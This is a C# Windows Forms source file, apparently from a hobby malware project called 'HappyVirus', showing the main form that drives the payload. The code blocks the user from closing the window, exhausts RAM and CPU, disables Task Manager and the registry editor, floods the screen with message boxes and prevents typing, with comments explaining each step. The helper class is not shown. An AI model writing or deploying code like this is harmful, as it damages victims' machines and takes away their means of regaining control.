using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using Utility.ModifyRegistry;
using Microsoft.Win32;

namespace HappyVirus_V_Edition
{
  public partial class Form1 : Form
  {
    HappyVirus virus1;

    public Form1()
    {
      InitializeComponent();

      // this will hide all the close, minimize and maximize buttons!
      this.ControlBox = false;

      // instanciating it..
      virus1 = new HappyVirus(this);

      // consuming ram and cpu..
      virus1.killResources(); 

      // disabling taskmgr and regedit..
      virus1.DisableWindowsFeature(HappyVirus.WindowsFeature.regedit, true); // give it false to anable it back.
      virus1.DisableWindowsFeature(HappyVirus.WindowsFeature.TaskManager, true);

      timer1.Start();
      timer2.Start();
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
      e.Cancel = true; // this will prevent the user from closing the form, even with Alt+F4!!
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      virus1.GenerateRandomMessageBoxes();
    }

    private void timer2_Tick(object sender, EventArgs e)
    {
      virus1.PreventTyping();
    }
  }
}
